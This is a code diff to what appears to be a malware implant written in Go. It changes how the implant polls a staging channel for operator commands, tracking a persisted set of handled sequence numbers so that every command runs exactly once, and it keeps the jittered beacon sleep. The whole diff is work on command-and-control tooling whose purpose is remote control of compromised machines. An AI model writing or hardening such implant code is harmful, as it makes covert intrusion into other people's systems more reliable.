@@ -294,20 +294,28 @@ func (im *implant) stagePublish(channel string, seq int, kind string, data []byt
 	return nil
 }
 
-// stageRead returns every complete message of one kind newer than afterSeq.
-func (im *implant) stageRead(channel, kind string, afterSeq int) ([][]byte, int) {
+// stageRead returns every complete message of one kind that has not been seen
+// yet. A single high-water mark is not enough: the operator and this implant
+// number their messages independently, so a command can legitimately arrive
+// with a sequence below the highest already processed. Tracking the set of
+// handled sequences is what keeps a skipped command from being lost forever.
+func (im *implant) stageRead(channel, kind string, seen map[int]bool) ([][]byte, int) {
 	msgs, err := im.stageList()
 	if err != nil {
 		im.logf("[!] stage list: %v", err)
-		return nil, afterSeq
+		return nil, 0
 	}
 	var mine []stageMsg
-	highest := afterSeq
+	highest := 0
 	for _, m := range msgs {
-		if m.Channel != channel || m.Kind != kind || m.Seq <= afterSeq {
+		if m.Channel != channel || m.Kind != kind {
+			continue
+		}
+		if seen[m.Seq] {
 			continue
 		}
 		mine = append(mine, m)
+		seen[m.Seq] = true
 		if m.Seq > highest {
 			highest = m.Seq
 		}
@@ -465,11 +473,17 @@ func (im *implant) runStage() {
 		}
 	}
 	im.logf("[*] resuming after seq %d", lastSeq)
+	seen := map[int]bool{}
+	for _, q := range im.loadSeenSeqs(stageCmd) {
+		seen[q] = true
+	}
 	for {
-		msgs, newSeq := im.stageRead(im.stageChan, stageCmd, lastSeq)
+		msgs, newSeq := im.stageRead(im.stageChan, stageCmd, seen)
 		if newSeq > lastSeq {
 			lastSeq = newSeq
-			im.saveStageState(lastSeq, stageCmd)
+		}
+		for _, q := range im.loadSeenSeqs(stageCmd) {
+			seen[q] = true
 		}
 		for _, raw := range msgs {
 			body := raw
@@ -515,6 +529,7 @@ func (im *implant) runStage() {
 				im.logf("[+] reply staged at seq %d", replySeq)
 			}
 		}
+		im.saveSeenSeqs(stageCmd, seen)
 		time.Sleep(im.interval + time.Duration(float64(im.jitter)*randFloat()))
 	}
 }
@@ -523,6 +538,32 @@ func (im *implant) runStage() {
 // independent cursors, and one channel must not inherit another's sequence.
 func (im *implant) stageStatePath(kind string) string {
 	return im.stateFile + ".stage." + im.stageChan + "." + kind
+}
+
+// loadSeenSeqs returns the command sequences already handled. A set, not a
+// high-water mark: the two sides number independently, so a lower sequence can
+// arrive later and must still run exactly once.
+func (im *implant) loadSeenSeqs(kind string) []int {
+	b, err := os.ReadFile(im.stageStatePath(kind) + ".seen")
+	if err != nil {
+		return nil
+	}
+	var out []int
+	for _, f := range strings.Fields(string(b)) {
+		if n, err := strconv.Atoi(f); err == nil {
+			out = append(out, n)
+		}
+	}
+	return out
+}
+
+func (im *implant) saveSeenSeqs(kind string, seen map[int]bool) {
+	var sb strings.Builder
+	for q := range seen {
+		fmt.Fprintf(&sb, "%d ", q)
+	}
+	os.WriteFile(im.stageStatePath(kind)+".seen",
+		[]byte(sb.String()), 0o600)
 }
 
 func (im *implant) loadStageState(kind string) (int, bool) {
